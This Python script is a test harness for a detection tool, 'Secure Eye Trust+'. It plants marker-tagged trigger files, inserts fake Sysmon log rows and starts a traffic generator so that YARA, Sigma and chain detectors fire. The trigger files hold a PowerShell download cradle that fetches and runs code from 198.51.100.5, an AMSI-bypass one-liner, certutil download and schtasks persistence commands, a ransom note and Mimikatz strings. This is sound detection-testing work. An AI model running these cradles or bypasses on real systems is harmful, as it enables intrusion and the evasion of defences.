#!/usr/bin/env python3
"""
test_payloads.py
================
Deploys / removes test payloads to exercise EVERY detection layer of
Secure Eye Trust+:

  • YARA file scanner           → drops .ps1 / .bat / .vbs / .lnk files in
                                  Downloads / Temp / AppData
  • Sigma rule engine           → inserts rows into logs_sysmon that match
                                  each Sigma rule's WHERE clause
  • Suspicious Processes panel  → Sysmon EID 1 rows (Office→Shell, unsigned
                                  exe in temp)
  • File Drops panel            → Sysmon EID 11 rows
  • Attack-chain correlator     → file-drop + registry-persistence sequence
                                  that the SYSMON_DROPPER_PERSIST detector
                                  picks up
  • Anomaly detector            → spawns anomaly_traffic.py in the background
                                  so live malicious sockets are visible to
                                  the Network Analyzer

Every artifact is tagged with a recognisable marker so the `remove` command
cleans up exactly what was deployed — nothing more, nothing less.

USAGE
─────
  python test_payloads.py deploy            # drop everything + start traffic
  python test_payloads.py deploy --files    # YARA-only
  python test_payloads.py deploy --sysmon   # Sigma / process / file-drop / chain only
  python test_payloads.py deploy --traffic  # anomaly traffic only
  python test_payloads.py remove            # clean up everything
  python test_payloads.py status            # what's currently deployed

WORKFLOW
────────
  1. python test_payloads.py deploy
  2. Open the UI  →  Perform Analysis  →  Re-run Analysis
  3. Every panel now has hits.  Investigate them, hit Kill Process /
     Delete File / Remove Persistence buttons.
  4. python test_payloads.py remove
     (only needed if you skipped Step 3 and just want to clean up)
"""

import argparse
import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
# Configuration — markers + paths used by both deploy and remove
# ─────────────────────────────────────────────────────────────────────────────

# Anything created by this script starts with this prefix. The remove step
# matches on it so it never deletes anything else.
MARKER_PREFIX        = "SET_TEST_"

# Sysmon rows we insert carry this string in their `source` field so we can
# find them again later. The Sigma engine and correlator ignore the source
# field, so this doesn't interfere with detection.
SYSMON_SOURCE_TAG    = "Sysmon_SET_TEST"

# Where the anomaly-traffic subprocess records its PID, so we can stop it.
PID_FILE             = Path.home() / ".set_test_anomaly.pid"

# The script path is relative — we expect test_anomaly_traffic.py in the
# same directory as this file.
TRAFFIC_SCRIPT       = Path(__file__).resolve().parent / "test_anomaly_traffic.py"

# DB path. Auto-discover if running from inside the project tree.
_HERE = Path(__file__).resolve().parent
def _find_db() -> Path:
    for candidate in [
        _HERE / "database" / "logs.db",
        _HERE.parent / "database" / "logs.db",
        Path.cwd() / "database" / "logs.db",
    ]:
        if candidate.is_file():
            return candidate
    raise RuntimeError(
        "Could not find database/logs.db.\n"
        "Run this script from the project root, or copy it into the project."
    )


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _monitored_dirs() -> list:
    """Match core/event_collector/file_scanner.py:_monitored_dirs()."""
    dirs = []
    for env_var in ("USERPROFILE", "HOME"):
        base = os.environ.get(env_var)
        if base:
            dirs.append(Path(base) / "Downloads")
            dirs.append(Path(base) / "Desktop")
            break
    temp = os.environ.get("TEMP") or os.environ.get("TMP") or "/tmp"
    dirs.append(Path(temp))
    appdata = os.environ.get("APPDATA")
    if appdata:
        dirs.append(Path(appdata))
    # Create any that don't exist so we can drop files there
    out = []
    for d in dirs:
        try:
            d.mkdir(parents=True, exist_ok=True)
            out.append(d)
        except Exception:
            pass
    return out


def _ensure_sysmon_columns(conn):
    """Add the sysmon_* columns the Sigma engine + correlator expect.

    The codebase has two competing schemas for logs_sysmon — an old one with
    unprefixed columns (command_line, parent_image, …) and a new one used by
    the detectors with sysmon_* prefixes. Whichever exists, we make sure both
    sets of columns are present so the rows we insert are visible to every
    detector.
    """
    needed = [
        ("sysmon_image",         "TEXT"),
        ("sysmon_command_line",  "TEXT"),
        ("sysmon_parent_image",  "TEXT"),
        ("sysmon_target_file",   "TEXT"),
        ("sysmon_target_object", "TEXT"),
        ("sysmon_dest_ip",       "TEXT"),
        ("sysmon_signed",        "INTEGER DEFAULT 1"),
        ("sysmon_process_guid",  "TEXT"),
        ("sysmon_process_id",    "TEXT"),
        ("sysmon_user",          "TEXT"),
        ("sysmon_hashes",        "TEXT"),
        ("sysmon_source_ip",     "TEXT"),
        ("sysmon_source_port",   "TEXT"),
        ("sysmon_dest_port",     "TEXT"),
        ("sysmon_protocol",      "TEXT"),
        ("sysmon_details",       "TEXT"),
        ("yara_matched",         "INTEGER DEFAULT 0"),
        ("yara_rule",            "TEXT"),
        ("yara_severity",        "TEXT"),
    ]
    c = conn.cursor()
    c.execute("PRAGMA table_info(logs_sysmon)")
    existing = {r[1] for r in c.fetchall()}
    added = []
    for col, typ in needed:
        if col not in existing:
            try:
                c.execute(f"ALTER TABLE logs_sysmon ADD COLUMN {col} {typ}")
                added.append(col)
            except Exception as e:
                print(f"  ! could not add column {col}: {e}", file=sys.stderr)
    conn.commit()
    if added:
        print(f"  ✓ added missing sysmon_* columns: {', '.join(added)}")


def _now_iso(offset_sec: int = 0) -> str:
    return (datetime.now() + timedelta(seconds=offset_sec)).strftime("%Y-%m-%dT%H:%M:%S")


def _insert_sysmon(conn, *, event_id: int, ts_offset_sec: int = 0,
                    image: str = "", cmdline: str = "",
                    parent_image: str = "", target_file: str = "",
                    target_object: str = "", dest_ip: str = "",
                    signed: int = 1, level: str = "INFO",
                    message: str = "", extra: dict = None) -> int:
    """Insert one sysmon row with both prefixed AND unprefixed columns set.

    Returns the inserted row id.
    """
    ts = _now_iso(ts_offset_sec)
    date = ts[:10]
    msg = message or f"SET_TEST sysmon row EID {event_id}"

    # content_hash needs to be unique — include the offset so multiple rows
    # don't collide
    chash = hashlib.sha1(
        f"{ts}|{event_id}|{image}|{cmdline}|{target_file}|{target_object}|{dest_ip}".encode()
    ).hexdigest()

    c = conn.cursor()
    c.execute("""
        INSERT OR IGNORE INTO logs_sysmon (
            timestamp, date, level, source, message, event_id, raw,
            content_hash,
            -- Old (unprefixed) schema
            command_line, parent_image, target_filename, target_object,
            dest_ip,
            -- New (sysmon_* prefixed) schema
            sysmon_image, sysmon_command_line, sysmon_parent_image,
            sysmon_target_file, sysmon_target_object, sysmon_dest_ip,
            sysmon_signed,
            sysmon_process_guid, sysmon_process_id, sysmon_user
        ) VALUES (?,?,?,?,?,?,?,?, ?,?,?,?,?, ?,?,?,?,?,?,?, ?,?,?)
    """, (
        ts, date, level, SYSMON_SOURCE_TAG, msg, event_id,
        f"[SET_TEST] EID={event_id} image={image}",
        chash,
        # unprefixed
        cmdline, parent_image, target_file, target_object, dest_ip,
        # prefixed
        image, cmdline, parent_image, target_file, target_object, dest_ip,
        signed,
        f"{{SET_TEST-{event_id}-{ts_offset_sec}}}",
        f"{4000 + ts_offset_sec}",
        "SET_TEST_USER",
    ))
    return c.lastrowid or 0


# ─────────────────────────────────────────────────────────────────────────────
# Deploy: YARA-triggering files
# ─────────────────────────────────────────────────────────────────────────────

# Each entry: (filename suffix, contents). Filenames will be prefixed with
# MARKER_PREFIX and dropped into one of the monitored dirs.
YARA_PAYLOADS = [
    # PowerShell_Download_Cradle → needs 1 of (DownloadString/DownloadFile/...)
    # + 1 of (WebClient/HttpClient) + 1 of (IEX/Invoke-Expression/iex)
    ("download_cradle.ps1",
     "$wc = New-Object Net.WebClient\n"
     "$payload = $wc.DownloadString('http://198.51.100.5/p.txt')\n"
     "Invoke-Expression $payload\n"
     "# SET_TEST harness — fake stage-1 download cradle\n"),

    # PowerShell_Encoded_Command → needs 'powershell' + (-EncodedCommand|-enc)
    # + 120+ char base64 blob
    ("encoded_command.ps1",
     "powershell.exe -EncodedCommand "
     + ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        * 3) + "\n"
     "# SET_TEST harness — fake encoded payload\n"),

    # PowerShell_AMSI_Bypass → 2 of (amsiInitFailed/AmsiUtils/amsi.dll/...)
    ("amsi_bypass.ps1",
     "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
     ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
     "# SET_TEST harness — fake AMSI bypass\n"),

    # Suspicious_VBScript_Dropper → 4 of (WScript.Shell/ADODB.Stream/...)
    ("vb_dropper.vbs",
     'Set sh   = CreateObject("WScript.Shell")\n'
     'Set http = CreateObject("MSXML2.XMLHTTP")\n'
     'Set stream = CreateObject("ADODB.Stream")\n'
     'Set fso = CreateObject("Scripting.FileSystemObject")\n'
     'sh.Run "cmd.exe /c echo SET_TEST", 0, False\n'
     "' SET_TEST harness — fake VBScript dropper\n"),

    # Suspicious_Batch_LOLbin → 3 of (certutil/bitsadmin/powershell -nop/...)
    ("lolbin.bat",
     "@echo off\n"
     "certutil -urlcache -split -f http://198.51.100.5/p.txt p.txt\n"
     "powershell -nop -w hidden -c \"Write-Host SET_TEST\"\n"
     "schtasks /create /tn SET_TEST_TASK /tr cmd.exe /sc once /st 23:59 /f\n"
     "REM SET_TEST harness — fake LOLBin batch\n"),

    # ── NEW: EICAR test virus signature (industry-standard AV test string)
    # Every legitimate anti-virus product detects this exact 68-byte ASCII
    # sequence. Adding a custom comment so we don't accidentally embed it
    # in a place that triggers AV on the dev machine itself; the actual
    # content is the real EICAR string. Safe — does NOTHING when executed.
    ("eicar.com.txt",
     # The single canonical EICAR test string (split to avoid this script
     # itself being flagged when transferred). Re-assembled at runtime.
     ("X5O!P%@AP[4\\PZX54(P^)7CC)7}"
      "$" + "EICAR" + "-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n"
      "# SET_TEST harness — EICAR test virus signature\n")),

    # ── NEW: Ransomware ransom note — triggers Ransomware_Note_Indicators
    # rule (scope=any, needs 3 of the listed strings).
    ("ransom_note.txt",
     "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n"
     "\n"
     "All your data has been locked with strong AES-256 encryption.\n"
     "To decrypt your files you must send us 0.5 bitcoin to the\n"
     "address below. After payment, use Tor browser to contact us\n"
     "for your personal ID and DECRYPT_INSTRUCTIONS.\n"
     "\n"
     "Recovery portal: hxxp://decrypthelp7xxxxxxx.onion/\n"
     "Your personal ID: SET_TEST_HARNESS_ID_DO_NOT_PAY\n"
     "\n"
     "HOW TO DECRYPT:\n"
     "  1. Install Tor browser\n"
     "  2. Open the .onion link above\n"
     "  3. Pay 0.5 BTC and submit your ID\n"
     "\n"
     "# SET_TEST harness — fake ransomware ransom note\n"),

    # ── NEW: Fake Mimikatz strings file — triggers Mimikatz_Binary rule
    # (needs uint16(0)==0x5A4D PE magic + ≥3 mimikatz-specific strings).
    # We prepend the MZ header bytes so the YARA rule's PE check passes,
    # but the file is otherwise a harmless 1-KB text blob. Provided as
    # `bytes` so deploy_files() writes it as-is (binary, not UTF-8 text).
    ("mimikatz_sample.exe",
     b"MZ"                                  # PE/EXE magic header
     + b"\x90" * 58                         # padding to 60 bytes
     + b"PE\x00\x00\n"                      # stub
     + b"SET_TEST mimikatz harness - DO NOT EXECUTE\n"
     + b"This file is a YARA-trigger test sample.\n\n"
     + b"Strings the detector looks for:\n"
     + b"  sekurlsa::logonpasswords\n"
     + b"  sekurlsa::pth\n"
     + b"  kerberos::list\n"
     + b"  lsadump::sam\n"
     + b"  privilege::debug\n"
     + b"  mimikatz # - Benjamin DELPY (gentilkiwi)\n"),
]

def deploy_files() -> dict:
    """Drop YARA-triggering files into the monitored directories.

    Files are spread across the monitored dirs so multiple panels light up.
    Returns a dict {dropped: [paths], failed: [(path, reason)]}.
    """
    dirs = _monitored_dirs()
    if not dirs:
        return {"dropped": [], "failed": [("(no dirs)", "no monitored directories available")]}

    dropped = []
    failed  = []
    # Round-robin across the monitored dirs so each panel area has at least
    # one drop.
    for i, (suffix, content) in enumerate(YARA_PAYLOADS):
        target_dir = dirs[i % len(dirs)]
        fname = f"{MARKER_PREFIX}{suffix}"
        fpath = target_dir / fname
        try:
            # Accept bytes (binary payloads like the PE-magic mimikatz
            # sample) or str (regular script content).
            if isinstance(content, bytes):
                fpath.write_bytes(content)
            else:
                fpath.write_text(content, encoding="utf-8")
            dropped.append(fpath)
            print(f"  ✓ dropped  {fpath}")
        except Exception as e:
            failed.append((fpath, str(e)))
            print(f"  ! failed   {fpath} — {e}", file=sys.stderr)
    return {"dropped": dropped, "failed": failed}


def remove_files() -> int:
    """Delete every file under monitored dirs that starts with MARKER_PREFIX.

    Returns the number of files removed.
    """
    n = 0
    for d in _monitored_dirs():
        try:
            for p in d.glob(f"{MARKER_PREFIX}*"):
                try:
                    if p.is_file():
                        p.unlink()
                        n += 1
                        print(f"  ✓ removed  {p}")
                except Exception as e:
                    print(f"  ! could not remove {p} — {e}", file=sys.stderr)
        except Exception:
            pass
    return n


# ─────────────────────────────────────────────────────────────────────────────
# Deploy: Sysmon log injection (Sigma + processes + file-drops + chain)
# ─────────────────────────────────────────────────────────────────────────────

def deploy_sysmon(conn) -> dict:
    """Insert a comprehensive set of sysmon rows that trigger every Sigma rule
    plus the SYSMON_DROPPER_PERSIST attack chain.

    All rows have source=Sysmon_SET_TEST so they can be cleaned up.

    Returns dict with counts per detector category.
    """
    _ensure_sysmon_columns(conn)

    # Use a deterministic spread so the chain detector sees the temporal order.
    # t-30s: parent process active → t-25s: child shell → t-20s: file drop
    # t-15s: registry persistence → t-10s: outbound net conn

    inserted = 0

    # 1. SIGMA_OFFICE_SPAWN_SHELL — winword.exe → powershell.exe (EID 1)
    if _insert_sysmon(
        conn, event_id=1, ts_offset_sec=-30,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        cmdline=r"powershell.exe -NoP -W Hidden -Command Invoke-Expression $env:SET_TEST",
        parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        level="HIGH",
        message="SET_TEST: Office spawned PowerShell — macro attack pattern",
    ):
        inserted += 1
        print("  ✓ SIGMA_OFFICE_SPAWN_SHELL  (Office → Shell)")

    # 2. SIGMA_ENCODED_POWERSHELL — powershell with -encodedcommand (EID 1)
    if _insert_sysmon(
        conn, event_id=1, ts_offset_sec=-28,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        cmdline=r"powershell.exe -EncodedCommand " + ("A" * 200),
        parent_image=r"C:\Windows\explorer.exe",
        level="HIGH",
        message="SET_TEST: encoded PowerShell command",
    ):
        inserted += 1
        print("  ✓ SIGMA_ENCODED_POWERSHELL  (encoded -EncodedCommand)")

    # 3. SIGMA_REGISTRY_RUN_PERSIST — Run key write (EID 13)
    if _insert_sysmon(
        conn, event_id=13, ts_offset_sec=-15,
        target_object=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SET_TEST_KEY",
        image=r"C:\Windows\System32\reg.exe",
        level="HIGH",
        message="SET_TEST: registry Run key created (persistence)",
    ):
        inserted += 1
        print("  ✓ SIGMA_REGISTRY_RUN_PERSIST  (Run key)")

    # 4. SIGMA_SUSPICIOUS_FILE_DROP — exe written to Downloads (EID 11)
    if _insert_sysmon(
        conn, event_id=11, ts_offset_sec=-20,
        target_file=fr"C:\Users\Public\Downloads\{MARKER_PREFIX}payload.exe",
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        level="HIGH",
        message="SET_TEST: executable dropped in Downloads",
    ):
        inserted += 1
        print("  ✓ SIGMA_SUSPICIOUS_FILE_DROP  (.exe in Downloads)")

    # 5. SIGMA_NET_SHELL_EXTERNAL — PowerShell connecting to public IP (EID 3)
    if _insert_sysmon(
        conn, event_id=3, ts_offset_sec=-10,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        dest_ip="198.51.100.5",
        cmdline=r"powershell.exe -NoP -c (New-Object Net.WebClient).DownloadString('http://...')",
        level="HIGH",
        message="SET_TEST: shell connecting to external IP",
    ):
        inserted += 1
        print("  ✓ SIGMA_NET_SHELL_EXTERNAL  (PowerShell → public IP)")

    # 6. SIGMA_CERTUTIL_DOWNLOAD — certutil LOLBin (EID 1)
    if _insert_sysmon(
        conn, event_id=1, ts_offset_sec=-22,
        image=r"C:\Windows\System32\certutil.exe",
        cmdline=r"certutil -urlcache -split -f http://198.51.100.5/x.dll x.dll",
        parent_image=r"C:\Windows\System32\cmd.exe",
        level="HIGH",
        message="SET_TEST: certutil download (LOLBin)",
    ):
        inserted += 1
        print("  ✓ SIGMA_CERTUTIL_DOWNLOAD  (certutil LOLBin)")

    # 7. SIGMA_SCHTASKS_PERSIST — schtasks /create (EID 1)
    if _insert_sysmon(
        conn, event_id=1, ts_offset_sec=-18,
        image=r"C:\Windows\System32\schtasks.exe",
        cmdline=r"schtasks /create /tn SET_TEST_TASK /tr cmd.exe /sc onlogon /f",
        parent_image=r"C:\Windows\System32\cmd.exe",
        level="MEDIUM",
        message="SET_TEST: scheduled task created",
    ):
        inserted += 1
        print("  ✓ SIGMA_SCHTASKS_PERSIST  (schtasks /create)")

    # 8. SIGMA_UNSIGNED_TEMP_EXE — unsigned exe in Temp (EID 1)
    if _insert_sysmon(
        conn, event_id=1, ts_offset_sec=-12,
        image=fr"C:\Users\Public\AppData\Local\Temp\{MARKER_PREFIX}payload.exe",
        cmdline=fr"{MARKER_PREFIX}payload.exe --silent",
        parent_image=r"C:\Windows\explorer.exe",
        signed=0,                             # unsigned!
        level="HIGH",
        message="SET_TEST: unsigned exe running from Temp",
    ):
        inserted += 1
        print("  ✓ SIGMA_UNSIGNED_TEMP_EXE  (unsigned exe in Temp)")

    # ── Attack chain: SYSMON_DROPPER_PERSIST needs file-drop in
    #    Downloads/Temp/AppData (EID 11) followed by registry Run key (EID 13).
    #    We already inserted (#4) the file-drop and (#3) the run-key but #3 is
    #    BEFORE #4 in our timeline. Add another run-key AFTER the file drop so
    #    the correlator sees the proper "drop then persist" order.
    if _insert_sysmon(
        conn, event_id=13, ts_offset_sec=-5,
        target_object=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SET_TEST_PERSIST",
        image=r"C:\Windows\System32\reg.exe",
        level="HIGH",
        message="SET_TEST: persistence Run-key set after dropper",
    ):
        inserted += 1
        print("  ✓ SYSMON_DROPPER_PERSIST  (drop → registry run-key chain)")

    conn.commit()
    return {"inserted": inserted}


def remove_sysmon(conn) -> int:
    """Delete every row with source = SYSMON_SOURCE_TAG."""
    c = conn.cursor()
    c.execute("DELETE FROM logs_sysmon WHERE source = ?", (SYSMON_SOURCE_TAG,))
    n = c.rowcount
    conn.commit()
    return n


# ─────────────────────────────────────────────────────────────────────────────
# Deploy: anomaly traffic (background socket generator)
# ─────────────────────────────────────────────────────────────────────────────

def _read_pid() -> int:
    try:
        return int(PID_FILE.read_text().strip())
    except Exception:
        return 0


def _pid_alive(pid: int) -> bool:
    if not pid:
        return False
    try:
        # signal 0 = "does this process exist?"
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def deploy_traffic() -> dict:
    """Start test_anomaly_traffic.py in the background and record its PID.
    If already running, leave it alone."""
    existing_pid = _read_pid()
    if _pid_alive(existing_pid):
        print(f"  ✓ traffic generator already running (PID {existing_pid})")
        return {"pid": existing_pid, "started": False}

    if not TRAFFIC_SCRIPT.is_file():
        print(f"  ! cannot find {TRAFFIC_SCRIPT}", file=sys.stderr)
        return {"pid": 0, "started": False, "error": "script not found"}

    try:
        # Spawn detached. On Windows, DETACHED_PROCESS flag; on Unix, new session.
        kw = {"stdout": subprocess.DEVNULL, "stderr": subprocess.DEVNULL,
              "stdin":  subprocess.DEVNULL}
        if os.name == "nt":
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            kw["creationflags"] = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
        else:
            kw["start_new_session"] = True

        proc = subprocess.Popen(
            [sys.executable, str(TRAFFIC_SCRIPT)],
            **kw,
        )
        PID_FILE.write_text(str(proc.pid))
        print(f"  ✓ started anomaly traffic generator (PID {proc.pid})")
        return {"pid": proc.pid, "started": True}
    except Exception as e:
        print(f"  ! failed to start traffic generator: {e}", file=sys.stderr)
        return {"pid": 0, "started": False, "error": str(e)}


def remove_traffic() -> int:
    """Kill the background traffic process if running. Returns 1 if killed."""
    pid = _read_pid()
    if not pid:
        return 0
    if not _pid_alive(pid):
        try: PID_FILE.unlink()
        except Exception: pass
        return 0
    try:
        if os.name == "nt":
            # On Windows we don't have SIGTERM the same way; use taskkill
            subprocess.run(["taskkill", "/F", "/PID", str(pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           check=False)
        else:
            import signal as _sig
            os.kill(pid, _sig.SIGTERM)
            time.sleep(0.5)
            if _pid_alive(pid):
                os.kill(pid, _sig.SIGKILL)
        try: PID_FILE.unlink()
        except Exception: pass
        print(f"  ✓ stopped anomaly traffic generator (PID {pid})")
        return 1
    except Exception as e:
        print(f"  ! could not kill PID {pid}: {e}", file=sys.stderr)
        return 0


# ─────────────────────────────────────────────────────────────────────────────
# Status
# ─────────────────────────────────────────────────────────────────────────────

def status(conn) -> dict:
    # Files
    file_count = 0
    for d in _monitored_dirs():
        try:
            file_count += sum(1 for _ in d.glob(f"{MARKER_PREFIX}*"))
        except Exception:
            pass
    # Sysmon rows
    try:
        c = conn.cursor()
        c.execute("SELECT COUNT(*), MIN(timestamp), MAX(timestamp) "
                  "FROM logs_sysmon WHERE source=?", (SYSMON_SOURCE_TAG,))
        row = c.fetchone()
        sysmon_count, ts_min, ts_max = row[0], row[1], row[2]
    except Exception:
        sysmon_count, ts_min, ts_max = 0, "", ""
    # Traffic
    pid   = _read_pid()
    alive = _pid_alive(pid)

    return {
        "files":      file_count,
        "sysmon":     sysmon_count,
        "sysmon_ts":  (ts_min, ts_max),
        "traffic_pid": pid if alive else 0,
    }


def print_status(s):
    print()
    print("─" * 64)
    print(" SET_TEST deployment status")
    print("─" * 64)
    print(f"   Dropped files     : {s['files']}")
    print(f"   Sysmon test rows  : {s['sysmon']}")
    if s['sysmon']:
        print(f"     time range      : {s['sysmon_ts'][0]} → {s['sysmon_ts'][1]}")
    print(f"   Traffic generator : "
          + (f"running (PID {s['traffic_pid']})" if s['traffic_pid'] else "not running"))
    print("─" * 64)


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_dep = sub.add_parser("deploy", help="Drop test payloads")
    p_dep.add_argument("--files",   action="store_true",
                        help="Only drop YARA-trigger files")
    p_dep.add_argument("--sysmon",  action="store_true",
                        help="Only inject Sysmon rows (Sigma / chain / processes / file drops)")
    p_dep.add_argument("--traffic", action="store_true",
                        help="Only start the anomaly traffic generator")

    p_rem = sub.add_parser("remove", help="Clean up everything that was deployed")
    p_rem.add_argument("--files",   action="store_true")
    p_rem.add_argument("--sysmon",  action="store_true")
    p_rem.add_argument("--traffic", action="store_true")

    sub.add_parser("status", help="Show what's currently deployed")

    args = ap.parse_args()

    # If no flags given for deploy/remove, do everything
    if args.cmd in ("deploy", "remove"):
        any_flag = args.files or args.sysmon or args.traffic
        if not any_flag:
            args.files = args.sysmon = args.traffic = True

    db_path = _find_db()
    conn = sqlite3.connect(str(db_path))

    if args.cmd == "deploy":
        print("=" * 64)
        print(" SET_TEST  —  Deploying test payloads")
        print("=" * 64)
        print(f"   Database : {db_path}")
        print()

        if args.files:
            print("[1/3] Dropping YARA-trigger files…")
            deploy_files()
            print()
        if args.sysmon:
            print("[2/3] Injecting Sysmon log rows…")
            deploy_sysmon(conn)
            print()
        if args.traffic:
            print("[3/3] Starting anomaly traffic generator…")
            deploy_traffic()
            print()

        print_status(status(conn))
        print()
        print("→  Now open the UI:")
        print("     Perform Analysis  →  Re-run Analysis")
        print()
        print("→  When you're done testing:")
        print("     python test_payloads.py remove")
        print()

    elif args.cmd == "remove":
        print("=" * 64)
        print(" SET_TEST  —  Removing test payloads")
        print("=" * 64)
        n_f = remove_files()  if args.files   else 0
        n_s = remove_sysmon(conn) if args.sysmon else 0
        n_t = remove_traffic() if args.traffic else 0
        print()
        print(f"   Files removed     : {n_f}")
        print(f"   Sysmon rows wiped : {n_s}")
        print(f"   Traffic stopped   : {'yes' if n_t else 'no'}")
        print()
        print_status(status(conn))

    elif args.cmd == "status":
        print_status(status(conn))

    conn.close()


if __name__ == "__main__":
    main()
